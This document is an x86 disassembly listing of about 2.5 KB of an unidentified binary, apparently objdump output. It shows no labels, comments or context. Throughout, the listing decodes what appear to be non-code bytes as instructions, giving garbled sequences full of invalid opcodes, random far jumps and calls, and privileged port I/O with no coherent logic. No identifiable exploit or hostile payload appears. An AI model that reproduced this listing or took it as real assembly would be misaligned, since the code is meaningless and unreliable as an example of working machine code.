  42e552:	sub    ecx,DWORD PTR [ecx+0x4515b635]
  42e558:	xchg   BYTE PTR [edx],bl
  42e55a:	outs   dx,BYTE PTR ds:[esi]
  42e55b:	xlat   BYTE PTR ds:[ebx]
  42e55c:	xor    bl,BYTE PTR [ecx-0xf]
  42e55f:	gs in  eax,0xdd
  42e562:	sbb    eax,0xef89a87
  42e567:	out    0x45,eax
  42e569:	nop
  42e56a:	sbb    cl,BYTE PTR [ebx+0x52]
  42e56d:	dec    esp
  42e56e:	dec    esi
  42e56f:	call   0xc7d3:0xb674aa72
  42e576:	xor    ch,BYTE PTR [ecx+0x2a]
  42e579:	jno    0x42e595
  42e57b:	(bad)  
  42e57c:	arpl   WORD PTR [ebp+0x55dbfa19],cx
  42e582:	(bad)  
  42e583:	mov    ds:0x5bc5055c,eax
  42e588:	(bad)  
  42e589:	or     DWORD PTR [ebp-0x7],ebp
  42e58c:	inc    ebx
  42e58d:	dec    edi
  42e58e:	dec    esp
  42e58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e590:	adc    dh,bl
  42e592:	xchg   ecx,eax
  42e593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e594:	gs push ebp
  42e596:	sar    DWORD PTR [edx],1
  42e598:	xor    ebp,DWORD PTR [ebx]
  42e59a:	ins    DWORD PTR es:[edi],dx
  42e59b:	sub    dh,BYTE PTR [eax-0x43]
  42e59e:	inc    ebp
  42e59f:	inc    eax
  42e5a0:	in     eax,dx
  42e5a1:	fimul  WORD PTR ds:0xeb2c8641
  42e5a7:	(bad)  
  42e5a8:	retf   
  42e5a9:	push   ebp
  42e5aa:	das    
  42e5ab:	and    DWORD PTR [eax-0x1e],ecx
  42e5ae:	add    al,0x44
  42e5b0:	pushf  
  42e5b1:	xchg   edi,eax
  42e5b2:	bound  esp,QWORD PTR [edx+0x71]
  42e5b5:	call   0xada2:0x4c420468
  42e5bc:	leave  
  42e5bd:	mov    edx,0xdcff5304
  42e5c2:	or     al,0x43
  42e5c4:	mov    ebx,0xa879a639
  42e5c9:	mov    edi,0x4e2fe7a3
  42e5ce:	or     DWORD PTR ds:0x568e67d9,0x7
  42e5d5:	frstor [esi-0x12]
  42e5d8:	fsubr  st(0),st
  42e5da:	(bad)  
  42e5db:	mov    dh,0x44
  42e5dd:	inc    ebx
  42e5de:	dec    ebp
  42e5df:	ins    BYTE PTR es:[edi],dx
  42e5e0:	in     eax,0x2b
  42e5e2:	sbb    al,0xd3
  42e5e4:	into   
  42e5e5:	push   ds
  42e5e6:	dec    edx
  42e5e7:	cli    
  42e5e8:	popa   
  42e5e9:	pop    ss
  42e5ea:	add    BYTE PTR [eax+0x6d],al
	...
  42e654:	add    BYTE PTR [eax],al
  42e656:	push   ebp
  42e657:	cmp    dh,cl
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	sub    BYTE PTR [ebx-0xfb26519],bh
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	inc    DWORD PTR [eax]
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	retf   
  42e66f:	dec    esp
  42e670:	xchg   ecx,eax
  42e671:	push   esp
  42e672:	cld    
  42e673:	or     eax,0x954c6783
  42e678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e679:	(bad)  
  42e67a:	lahf   
  42e67b:	lods   eax,DWORD PTR ds:[esi]
  42e67c:	or     BYTE PTR [edx],ch
  42e67e:	in     al,0xa8
  42e680:	mov    ds:0x5b7769fa,eax
  42e685:	add    DWORD PTR [edx],edi
  42e687:	add    ecx,DWORD PTR [ebx+ecx*8]
  42e68a:	loopne 0x42e633
  42e68c:	xchg   edx,eax
  42e68d:	and    edi,DWORD PTR [ecx-0x2b]
  42e690:	jecxz  0x42e69f
  42e692:	push   ss
  42e693:	cmp    esp,edi
  42e695:	stc    
  42e696:	(bad)  
  42e697:	lock loop 0x42e6e5
  42e69a:	ja     0x42e6d9
  42e69c:	xchg   ecx,eax
  42e69d:	(bad)  
  42e69e:	fldcw  WORD PTR [esi+0x5e]
  42e6a2:	cmp    edx,DWORD PTR [ecx+eiz*2+0x5cc01208]
  42e6a9:	ret    
  42e6aa:	jg     0x42e720
  42e6ac:	adc    dh,BYTE PTR [edi+0x2c]
  42e6af:	jae    0x42e667
  42e6b1:	and    edi,DWORD PTR [ebx-0x43462821]
  42e6b7:	or     eax,0x2a9a9a2d
  42e6bc:	and    esp,0x1cd67600
  42e6c2:	dec    esp
  42e6c3:	push   ebx
  42e6c4:	in     al,dx
  42e6c5:	xchg   ebp,eax
  42e6c6:	fsubr  QWORD PTR [eax]
  42e6c8:	mov    ch,0xaa
  42e6ca:	cmp    BYTE PTR [ecx+eax*2+0x4d],cl
  42e6ce:	push   cs
  42e6cf:	and    al,0xd2
  42e6d1:	cwde   
  42e6d2:	adc    ah,0xaf
  42e6d5:	sub    eax,0x5981b16
  42e6da:	jne    0x42e70c
  42e6dc:	mul    BYTE PTR [eax]
  42e6de:	repz xor BYTE PTR ds:0x84ba6d21,dh
  42e6e5:	in     eax,0x88
  42e6e7:	(bad)  
  42e6e8:	fstp   TBYTE PTR [esi+eiz*2]
  42e6eb:	jns    0x42e705
  42e6ed:	jnp    0x42e76d
  42e6ef:	jae    0x42e6af
  42e6f1:	jo     0x42e698
  42e6f3:	pop    ebp
  42e6f4:	shl    ebp,1
  42e6f6:	jmp    0xdaa2:0x512da81a
  42e6fd:	add    eax,0x19ef0ea0
  42e702:	jae    0x42e6ed
  42e704:	out    0x81,al
  42e706:	lods   al,BYTE PTR ds:[esi]
  42e707:	push   0x2f
  42e709:	imul   esp,DWORD PTR [eax+0xc],0x9e03cd40
  42e710:	mov    dh,0x63
  42e712:	icebp  
  42e713:	fidiv  DWORD PTR [edi]
  42e715:	leave  
  42e716:	push   0xffffff9d
  42e718:	sbb    BYTE PTR [edi+0x71],0xc6
  42e71c:	inc    edx
  42e71d:	mov    es,WORD PTR [ebp+0x4aeb3ecd]
  42e723:	mov    BYTE PTR [ebx],dh
  42e725:	or     dh,BYTE PTR [edi]
  42e727:	jns    0x42e6fb
  42e729:	mov    dh,0x87
  42e72b:	ins    BYTE PTR es:[edi],dx
  42e72c:	std    
  42e72d:	ja     0x42e72b
  42e72f:	mov    al,BYTE PTR [esi+0x52]
  42e732:	inc    ebp
  42e733:	jge    0x42e751
  42e735:	jo     0x42e6fa
  42e737:	push   ebx
  42e738:	test   al,0xa9
  42e73a:	bound  esi,QWORD PTR [ebp-0xc9e947c]
  42e740:	rcr    BYTE PTR [esi-0x7],cl
  42e743:	pop    ecx
  42e744:	jb     0x42e7a8
  42e746:	add    BYTE PTR [eax],bh
  42e748:	dec    edi
  42e749:	mov    ebx,DWORD PTR [eax+0x7921446f]
  42e74f:	fadd   st(0),st
  42e751:	pop    ebp
  42e752:	and    bl,BYTE PTR [eax]
  42e754:	ins    DWORD PTR es:[edi],dx
  42e755:	jmp    0x42e7bd
  42e757:	inc    edi
  42e758:	pop    ebx
  42e759:	idiv   eax
  42e75b:	sbb    BYTE PTR [edi+ecx*1-0x29],bh
  42e75f:	cs scas eax,DWORD PTR es:[edi]
  42e761:	shl    BYTE PTR [edx-0x53],0xbf
  42e765:	sti    
  42e766:	push   esi
  42e767:	push   esp
  42e768:	ins    BYTE PTR es:[edi],dx
  42e769:	mov    dh,0x52
  42e76b:	xchg   esp,eax
  42e76c:	popf   
	...
  42e7d5:	add    BYTE PTR [edx+0x39],bl
  42e7d8:	dec    esi
  42e7d9:	sub    eax,0x7f7b7f6f
  42e7de:	sub    BYTE PTR fs:[esi],cl
  42e7e1:	ficomp DWORD PTR [esi+0x22]
  42e7e4:	and    esi,DWORD PTR [edx+0x1f14c]
  42e7ea:	inc    DWORD PTR [eax]
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	sar    edx,cl
  42e7f0:	xor    esp,eax
  42e7f2:	mov    DWORD PTR [ecx+0x3f],0x59b46d5e
  42e7f9:	aad    0x77
  42e7fb:	jmp    0x6d036c11
  42e800:	imul   esi,edi,0x9e9ea6c4
  42e806:	cmp    BYTE PTR [edx-0x12],ch
  42e809:	out    dx,eax
  42e80a:	scas   eax,DWORD PTR es:[edi]
  42e80b:	data16 jno 0x42e866
  42e80e:	mov    ch,0x50
  42e810:	sbb    al,0x3c
  42e812:	fs push 0x52e0d488
  42e818:	ins    BYTE PTR es:[edi],dx
  42e819:	popa   
  42e81a:	jecxz  0x42e835
  42e81c:	jbe    0x42e80c
  42e81e:	shl    BYTE PTR [ebx],cl
  42e820:	stos   DWORD PTR es:[edi],eax
  42e821:	loopne 0x42e7f6
  42e823:	push   cs
  42e824:	sub    eax,0x46d846a6
  42e829:	test   eax,0x6ac7f5d3
  42e82e:	xchg   esi,eax
  42e82f:	pop    eax
  42e830:	mov    ch,0x44
  42e832:	and    eax,0x64d99c65
  42e837:	xchg   edi,eax
  42e838:	fwait
  42e839:	dec    ebp
  42e83a:	mov    al,ds:0x9195ba68
  42e83f:	sub    eax,0x4e7a0c72
  42e844:	gs gs gs (bad) 
  42e848:	or     ch,BYTE PTR [edx]
  42e84a:	mov    ch,BYTE PTR [edi-0x8d498d7]
  42e850:	mov    DWORD PTR [ebp+0x79],edx
  42e853:	push   edi
  42e854:	xrelease mov DWORD PTR [edi+0x45dd9ac6],ebp
  42e85b:	push   cs
  42e85c:	and    dh,BYTE PTR [ebx+0x4e]
  42e85f:	fistp  WORD PTR [eax-0x35739f9a]
  42e865:	mov    cl,0x7c
  42e867:	fdiv   st,st(2)
  42e869:	mov    cl,0x4b
  42e86b:	dec    edi
  42e86c:	jne    0x42e875
  42e86e:	aaa    
  42e86f:	shl    BYTE PTR [ebp-0x53],1
  42e872:	shl    DWORD PTR [ebp-0x5a],cl
  42e875:	and    dl,ch
  42e877:	adc    DWORD PTR [edx-0x34],esp
  42e87a:	call   0x7fbe8245
  42e87f:	mov    bl,0x1a
  42e881:	je     0x42e8bf
  42e883:	sbb    al,0x67
  42e885:	jp     0x42e87b
  42e887:	fidivr WORD PTR [eax+esi*2-0x56]
  42e88b:	mov    DWORD PTR [esi],edi
  42e88d:	in     al,0x24
  42e88f:	cwde   
  42e890:	scas   eax,DWORD PTR es:[edi]
  42e891:	mov    ds:0x69f462fb,eax
  42e896:	in     al,0x8c
  42e898:	mov    dh,0xb8
  42e89a:	std    
  42e89b:	xchg   esp,eax
  42e89c:	ret    0x2f61
  42e89f:	fsubp  st(5),st
  42e8a1:	fmulp  st(1),st
  42e8a3:	test   BYTE PTR [esi],bh
  42e8a5:	sub    esp,DWORD PTR [edi-0x26f8c553]
  42e8ab:	jnp    0x42e8ce
  42e8ad:	addr16 iret 
  42e8af:	jg     0x42e889
  42e8b1:	and    al,0x1
  42e8b3:	xor    DWORD PTR [esi+eax*2-0x4a853ec],eax
  42e8ba:	fiadd  DWORD PTR [edx+ebp*4+0x5c]
  42e8be:	push   0xe3b8b14e
  42e8c3:	mov    dh,0xe2
  42e8c5:	sar    DWORD PTR [ebx+esi*4-0x217224d6],0x47
  42e8cd:	add    al,0xa9
  42e8cf:	push   esp
  42e8d0:	(bad)  
  42e8d2:	out    0xc9,eax
  42e8d4:	sub    BYTE PTR [edx-0x44],dl
  42e8d7:	mov    ebp,0x2495dc12
  42e8dc:	adc    esi,edi
  42e8de:	adc    BYTE PTR [ecx],bh
  42e8e0:	pop    es
  42e8e1:	or     eax,0x8d9973dc
  42e8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8e7:	into   
  42e8e8:	push   ecx
  42e8e9:	add    DWORD PTR [eax-0x6e],edx
  42e8ec:	add    DWORD PTR [eax],0x0
	...
  42e953:	add    BYTE PTR [eax],al
  42e955:	add    bl,al
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x46dc07d5]
  42e963:	ror    bl,1
  42e965:	jne    0x42e9b2
  42e967:	repnz add DWORD PTR [eax],eax
  42e96a:	inc    DWORD PTR [eax]
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	inc    ecx
  42e96f:	sbb    DWORD PTR [ebx+0x384d0911],eax
  42e975:	repnz stos BYTE PTR es:[edi],al
  42e977:	lea    ecx,[esi]
  42e979:	inc    esp
  42e97a:	push   es
  42e97b:	xor    ah,BYTE PTR [edi+0x7]
  42e97e:	xor    al,0xae
  42e980:	lock xchg DWORD PTR [eax+0x5bb77c82],edi
  42e987:	ret    0xe50f
  42e98a:	fsubr  QWORD PTR [edx-0x3530b867]
  42e990:	adc    BYTE PTR [eax],dl
  42e992:	sub    ecx,DWORD PTR [edx+0x23ea34cc]
  42e998:	repnz rol BYTE PTR [ebx+0x64797db6],0x26
  42e9a0:	push   0x769e59f3
  42e9a5:	lock or DWORD PTR ds:0x1a814a0e,esp
  42e9ac:	neg    DWORD PTR [edi-0x4b]
  42e9af:	dec    esi
  42e9b0:	mov    al,0x8d
  42e9b2:	leave  
  42e9b3:	push   ebp
  42e9b4:	sbb    ebx,ebp
  42e9b6:	mov    edx,0xdb3d927b
  42e9bb:	push   edx
  42e9bc:	fs mov edi,0xeeeb437a
  42e9c2:	mov    bl,0xee
  42e9c4:	cmp    eax,edx
  42e9c6:	xchg   DWORD PTR [esi],ebp
  42e9c8:	xchg   esp,eax
  42e9c9:	stc    
  42e9ca:	cld    
  42e9cb:	iret   
  42e9cc:	popf   
  42e9cd:	push   ecx
  42e9ce:	jae    0x42e9b7
  42e9d0:	test   DWORD PTR [edi+0xd],esi
  42e9d3:	adc    al,0x4e
  42e9d5:	sbb    ch,BYTE PTR [esi-0x4df46bb8]
  42e9db:	sbb    BYTE PTR [edx-0x1d],al
  42e9de:	xchg   ebp,eax
  42e9df:	jb     0x42ea1e
  42e9e1:	mov    al,0xa7
  42e9e3:	test   al,0xea
  42e9e5:	dec    ebp
  42e9e6:	fwait
  42e9e7:	ins    DWORD PTR es:[edi],dx
  42e9e8:	enter  0x14f9,0xcb
  42e9ec:	cmp    eax,DWORD PTR [edx+0x1d026b6f]
  42e9f2:	xor    ebp,DWORD PTR [edi+0x7ff1505f]
  42e9f8:	jne    0x42e97f
  42e9fa:	repz (bad) 
  42e9fc:	sbb    DWORD PTR [eax+0x22],edx
  42e9ff:	in     al,0x16
  42ea01:	push   es
  42ea02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea03:	add    esi,0x93219aed
  42ea09:	enter  0x1841,0x4f
  42ea0d:	idiv   DWORD PTR [esi+edx*2]
  42ea10:	jle    0x42ea40
  42ea12:	cmp    eax,0x9714a241
  42ea17:	call   0xe55f72d3
  42ea1c:	add    bl,BYTE PTR [ebp+esi*1+0x6e594623]
  42ea23:	jecxz  0x42eaa3
  42ea25:	das    
  42ea26:	mov    ah,0x34
  42ea28:	std    
  42ea29:	repnz adc al,0x60
  42ea2c:	outs   dx,BYTE PTR ds:[esi]
  42ea2d:	and    eax,0xbf940b3c
  42ea32:	(bad)  
  42ea33:	push   esp
  42ea34:	leave  
  42ea35:	sbb    BYTE PTR [edx-0x2534c17d],0xa1
  42ea3c:	mov    dh,0x4b
  42ea3e:	mov    ds:0x8131b3b8,al
  42ea43:	add    edi,edx
  42ea45:	xor    BYTE PTR [esi+0x6],bl
  42ea48:	push   ebp
  42ea49:	dec    esi
  42ea4a:	mov    esp,DWORD PTR [ebp-0x6e98713b]
  42ea50:	leave  
  42ea51:	xor    DWORD PTR [esi+0x1d614536],edx
  42ea57:	inc    ecx
  42ea58:	ret    0x3ea1
  42ea5b:	and    dh,BYTE PTR ss:[esi]
  42ea5e:	retf   
  42ea5f:	rol    BYTE PTR [ebx],cl
  42ea61:	inc    ebp
  42ea62:	out    dx,eax
  42ea63:	pop    es
  42ea64:	jo     0x42ea05
  42ea66:	dec    ebx
  42ea67:	mov    gs:0xcb6f88f0,al
	...
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	mov    cl,0x56
  42eae4:	inc    esp
  42eae5:	dec    ebx
  42eae6:	dec    edx
  42eae7:	repz add DWORD PTR [eax],eax
  42eaea:	inc    DWORD PTR [eax]
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	rcl    DWORD PTR [edx],0x5a
  42eaf1:	inc    ebp
  42eaf2:	sbb    bh,BYTE PTR [edx]
  42eaf4:	xor    edx,esp
  42eaf6:	pop    ebp
  42eaf7:	popf   
  42eaf8:	and    ebp,edi
  42eafa:	mov    edi,DWORD PTR [edx+0x7de24c6f]
  42eb00:	xor    eax,0xe70d133
  42eb05:	or     al,0xa5
  42eb07:	and    ebp,esi
  42eb09:	nop
  42eb0a:	icebp  
  42eb0b:	mov    ecx,0x2faf64f2
  42eb10:	push   ds
  42eb11:	jg     0x42eab2
  42eb13:	pop    edi
  42eb14:	mov    ebp,0x7eb81fbe
  42eb19:	fldenv [ebx+0x77]
  42eb1c:	outs   dx,BYTE PTR ds:[esi]
  42eb1d:	or     eax,0x803c468b
  42eb22:	jb     0x42eb95
  42eb24:	xchg   ecx,eax
  42eb25:	inc    edi
  42eb26:	mov    al,0x40
  42eb28:	and    al,0x4b
  42eb2a:	push   edi
  42eb2b:	mov    eax,DWORD PTR [edi+0x12]
  42eb2e:	int    0xcb
  42eb30:	je     0x42eb4f
  42eb32:	mov    eax,0x57ee710c
  42eb37:	jbe    0x42eb7c
  42eb39:	(bad)  
  42eb3a:	rol    ebx,cl
  42eb3c:	int3   
  42eb3d:	not    BYTE PTR [esi]
  42eb3f:	jbe    0x42eb52
  42eb41:	cmp    DWORD PTR [edx-0x88e3311],esp
  42eb47:	add    dh,dh
  42eb49:	jl     0x42eaf5
  42eb4b:	jnp    0x42eb1b
  42eb4d:	inc    esi
  42eb4e:	jmp    0x42eb5c
  42eb50:	je     0x42ebbd
  42eb52:	pop    edx
  42eb53:	inc    ecx
  42eb54:	aas    
  42eb55:	loop   0x42eae9
  42eb57:	pop    ebx
  42eb58:	push   ecx
  42eb59:	(bad)  
  42eb5a:	gs sbb eax,0x3a483c47
  42eb60:	adc    DWORD PTR [ebx+0x13aa916f],esp
  42eb66:	add    eax,esi
  42eb68:	dec    ebx
  42eb69:	inc    ebp
  42eb6a:	lds    esp,FWORD PTR [ecx+eiz*1-0x24]
  42eb6e:	or     dl,ch
  42eb70:	add    DWORD PTR [esi-0x7d],0xd3333dfb
  42eb77:	ins    BYTE PTR es:[edi],dx
  42eb78:	pop    ds
  42eb79:	scas   eax,DWORD PTR es:[edi]
  42eb7a:	lods   al,BYTE PTR ds:[esi]
  42eb7b:	cmp    eax,0xc247561f
  42eb80:	(bad)  
  42eb81:	mov    cl,0x9f
  42eb83:	or     edi,DWORD PTR cs:[esi+0x4a958aa0]
  42eb8a:	mov    WORD PTR [ebx],gs
  42eb8c:	ss in  al,0x3
  42eb8f:	dec    edx
  42eb90:	into   
  42eb91:	mov    bl,0xa1
  42eb93:	test   BYTE PTR [ecx+0x17efd35c],0x60
  42eb9a:	pop    ss
  42eb9b:	add    ebp,DWORD PTR [esi-0xe]
  42eb9e:	xchg   edx,eax
  42eb9f:	je     0x42eb36
  42eba1:	xor    eax,DWORD PTR [ebx+0x4]
  42eba4:	push   esi
  42eba5:	pop    ds
  42eba6:	mov    esi,0x1fb3bfc8
  42ebab:	lahf   
  42ebac:	adc    eax,0x54369e25
  42ebb1:	xor    eax,0xfbdbb767
  42ebb6:	pushf  
  42ebb7:	mov    bh,0x7
  42ebb9:	arpl   WORD PTR [ecx+0x5e380f3b],sp
  42ebbf:	cmp    ecx,0xb844c9a0
  42ebc5:	rol    BYTE PTR [ebx+0x1a3574c8],0xfa
  42ebcc:	jb     0x42ec0b
  42ebce:	(bad)  
  42ebcf:	retf   0x9439
  42ebd2:	xchg   esp,eax
  42ebd3:	cmp    BYTE PTR [edx],0x9b
  42ebd6:	mov    al,0x54
  42ebd8:	sbb    ah,bl
  42ebda:	sahf   
  42ebdb:	outs   dx,DWORD PTR ds:[esi]
  42ebdc:	mov    edx,0xdaa5017c
  42ebe1:	adc    eax,0xd9e700ce
  42ebe6:	xchg   ecx,eax
  42ebe7:	push   cs
  42ebe8:	rcl    DWORD PTR [eax],0xa9
  42ebeb:	cli    
  42ebec:	push   0x0
	...
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	or     DWORD PTR [eax-0x68],0xf44975c1
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	inc    DWORD PTR [eax]
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	xor    BYTE PTR [edi],ch
  42ec70:	mov    dh,0xa1
  42ec72:	sbb    dh,al
  42ec74:	(bad)  
  42ec75:	pushf  
  42ec76:	add    ah,dl
  42ec78:	pushf  
  42ec79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec7a:	lods   eax,DWORD PTR ds:[esi]
  42ec7b:	das    
  42ec7c:	jmp    0xccef4300
  42ec81:	loop   0x42ec13
  42ec83:	cli    
  42ec84:	mov    cl,BYTE PTR [esi-0x37b02649]
  42ec8a:	call   0x8594:0x3978d2a6
  42ec91:	and    esp,DWORD PTR [eax-0x4e36478c]
  42ec97:	sub    ch,BYTE PTR [eax+0x61ca1d40]
  42ec9d:	fwait
  42ec9e:	pmulhuw mm7,mm6
  42eca1:	pusha  
  42eca2:	pusha  
  42eca3:	lods   al,BYTE PTR ds:[esi]
  42eca4:	fdivr  st(4),st
  42eca6:	pop    edi
  42eca7:	out    0xa7,al
  42eca9:	pusha  
  42ecaa:	xchg   ebx,eax
  42ecab:	test   DWORD PTR [eax-0x27e051a6],0x50213163
  42ecb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecb6:	mov    WORD PTR [eax+0x36],fs
  42ecb9:	dec    eax
  42ecba:	out    0x4c,al
  42ecbc:	ss jne 0x42ecf7
  42ecbf:	inc    esp
  42ecc0:	pop    ebx
  42ecc1:	jnp    0x42ecaf
  42ecc3:	add    esi,ecx
  42ecc5:	and    BYTE PTR [ebp+0x6767dfe6],bl
  42eccb:	cmp    DWORD PTR [ecx+0xb09c710],esp
  42ecd1:	inc    esi
  42ecd2:	mov    cl,0x18
  42ecd4:	int3   
  42ecd5:	enter  0x9fdd,0xf6
  42ecd9:	pushw  es
  42ecdb:	mov    eax,ds:0x6f82ba6e
  42ece0:	sbb    BYTE PTR [ebx],ah
  42ece2:	test   DWORD PTR [edx-0x3015a4f4],ebx
  42ece8:	cmp    cl,al
  42ecea:	jg     0x42ed5c
  42ecec:	hlt    
  42eced:	retf   0x5be5
  42ecf0:	jb     0x42ed34
  42ecf2:	push   ebp
  42ecf3:	mov    ecx,0xbfd99520
  42ecf8:	push   0x9cb5fc09
  42ecfd:	stc    
  42ecfe:	(bad)  
  42ecff:	out    dx,al
  42ed00:	jmp    0xaacf9785
  42ed05:	in     al,dx
  42ed06:	ss sti 
  42ed08:	jnp    0x42eca9
  42ed0a:	mov    bh,0x8
  42ed0c:	mov    edx,0x425c637c
  42ed11:	push   cs
  42ed12:	lahf   
  42ed13:	push   0xaac6280d
  42ed18:	add    cl,0x81
  42ed1b:	jb     0x42ecf4
  42ed1d:	pop    eax
  42ed1e:	mov    bl,0x24
  42ed20:	data16 fisubr WORD PTR [eax]
  42ed23:	test   BYTE PTR [edi+0x37b01052],bl
  42ed29:	xor    al,BYTE PTR ds:0x19e3d1a7
  42ed2f:	and    al,0xc6
  42ed31:	pop    eax
  42ed32:	sub    ebp,DWORD PTR [ecx+0x0]
  42ed35:	call   0x226b:0x562d2dac
  42ed3c:	test   DWORD PTR [esi+ebp*4-0x336d23a0],0x44a055bb
  42ed47:	ud1    ecx,DWORD PTR [ecx-0x38]
  42ed4b:	mov    ebp,0x8d848d94
  42ed50:	mov    esp,cs
  42ed52:	add    esp,DWORD PTR [edx-0x20]
  42ed55:	scas   al,BYTE PTR es:[edi]
  42ed56:	(bad)  
  42ed58:	outs   dx,BYTE PTR ds:[esi]
  42ed59:	gs test edx,edx
  42ed5c:	cld    
  42ed5d:	push   ss
  42ed5e:	iret   
  42ed5f:	adc    al,0xca
  42ed61:	mov    ds:0xc5b4f1f5,al
  42ed66:	fld    DWORD PTR [ebx]
  42ed68:	push   0x2027a30f
	...
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp-0x139bdb5e]
  42ede5:	loopne 0x42ee2f
  42ede7:	cmc    
  42ede8:	add    DWORD PTR [eax],eax
  42edea:	inc    DWORD PTR [eax]
  42edec:	add    BYTE PTR [eax],al
  42edee:	rol    edi,1
  42edf0:	pop    ebp
  42edf1:	pop    ds
  42edf2:	sbb    BYTE PTR [ebp+0x4a1160d3],bl
  42edf8:	cmp    dh,BYTE PTR [eax-0x4edd78d]
  42edfe:	adc    esi,DWORD PTR [edx+0x4d]
  42ee01:	inc    ebp
  42ee02:	push   eax
  42ee03:	mov    esp,0xf6d60e6d
  42ee08:	imul   ecx,DWORD PTR [ecx],0x17eed0c4
  42ee0e:	dec    BYTE PTR [edx]
  42ee10:	sbb    ah,dh
  42ee12:	aaa    
  42ee13:	dec    eax
  42ee14:	out    0x86,eax
  42ee16:	test   al,0x30
  42ee18:	xor    esp,esp
  42ee1a:	(bad)  
  42ee1b:	iret   
  42ee1c:	jno    0x42ee21
  42ee1e:	fwait
  42ee1f:	mov    al,ds:0x28d57f69
  42ee24:	retf   
  42ee25:	and    DWORD PTR [esi-0x14],edi
  42ee28:	mov    bh,0x98
  42ee2a:	push   es
  42ee2b:	xchg   cx,ax
  42ee2d:	and    DWORD PTR [ebx],esi
  42ee2f:	push   eax
  42ee30:	sub    ecx,esi
  42ee32:	lds    edx,FWORD PTR [eax+edx*8-0x1]
  42ee36:	pop    ebp
  42ee37:	dec    esi
  42ee38:	mov    bl,0xb4
  42ee3a:	sbb    ch,BYTE PTR [edx]
  42ee3c:	les    edx,FWORD PTR [edi]
  42ee3e:	stos   DWORD PTR es:[edi],eax
  42ee3f:	xchg   esp,eax
  42ee40:	and    esi,DWORD PTR [esi-0x57]
  42ee43:	ins    DWORD PTR es:[edi],dx
  42ee44:	pop    ecx
  42ee45:	sub    DWORD PTR [esi-0x9],esp
  42ee48:	dec    esi
  42ee49:	loop   0x42ee81
  42ee4b:	inc    edx
  42ee4c:	jle    0x42edd2
  42ee4e:	adc    BYTE PTR [eax*4+0x4bc58924],cl
  42ee55:	or     ch,ch
  42ee57:	cmc    
  42ee58:	vmaxps ymm7,ymm3,ymm7
  42ee5c:	jp     0x42ee8e
  42ee5e:	test   DWORD PTR [ebp+ebx*4+0x6c],eax
  42ee62:	test   al,0x1d
  42ee64:	dec    ebx
  42ee65:	jmp    0xb9f:0x591e9e86
  42ee6c:	sub    al,0x94
  42ee6e:	and    eax,0xbf0f4d6b
  42ee73:	(bad)  
  42ee75:	push   eax
  42ee76:	and    BYTE PTR [ecx],dl
  42ee78:	scas   al,BYTE PTR es:[edi]
  42ee79:	js     0x42ee9a
  42ee7b:	paddsb mm0,QWORD PTR [ebp-0x1a785f5]
  42ee82:	ja     0x42eee4
  42ee84:	ins    BYTE PTR es:[edi],dx
  42ee85:	xor    al,0x21
  42ee87:	dec    BYTE PTR [edi+0x5e]
  42ee8a:	adc    al,0x9
  42ee8c:	(bad)  
  42ee8d:	shr    DWORD PTR [ebp+0x7023520b],cl
  42ee93:	shl    DWORD PTR [eax+0xe],1
  42ee96:	dec    esi
  42ee97:	cdq    
  42ee98:	mul    al
  42ee9a:	fwait
  42ee9b:	mov    cl,0xe0
  42ee9d:	mov    ebx,0xcb51f994
  42eea2:	cli    
  42eea3:	mov    al,ds:0x311490b0
  42eea8:	dec    esp
  42eea9:	data16 out dx,al
  42eeab:	dec    edx
  42eeac:	mov    edx,0xcfa5467
  42eeb1:	cmp    cl,dh
  42eeb3:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeb5:	mov    ecx,0x930e80b6
  42eeba:	jecxz  0x42ee8f
  42eebc:	les    esi,FWORD PTR [edx]
  42eebe:	push   ebp
  42eebf:	loop   0x42ef32
  42eec1:	xor    esp,eax
  42eec3:	call   0x832a:0x49d1cc5e
  42eeca:	jge    0x42ee82
  42eecc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eece:	sbb    al,0xeb
  42eed0:	cmp    cl,BYTE PTR [ebx+0x6]
  42eed3:	js     0x42eec6
  42eed5:	dec    eax
  42eed6:	push   esp
  42eed7:	add    DWORD PTR [ecx],edi
  42eed9:	es out dx,eax
  42eedb:	in     eax,dx
  42eedc:	les    eax,FWORD PTR [ebx]
  42eede:	aaa    
  42eedf:	xor    al,0x78
  42eee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eee2:	jp     0x42ef1a
  42eee4:	dec    edx
  42eee5:	rcl    ebp,cl
  42eee7:	or     al,0x40
  42eee9:	inc    ebp
  42eeea:	(bad)  
  42eeeb:	mov    ebx,0xb4
	...
  42ef54:	add    BYTE PTR [eax],al
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	sub    DWORD PTR [ebp+ecx*8-0x6b],esi
  42ef66:	inc    edi
  42ef67:	test   BYTE PTR [ecx],0x0
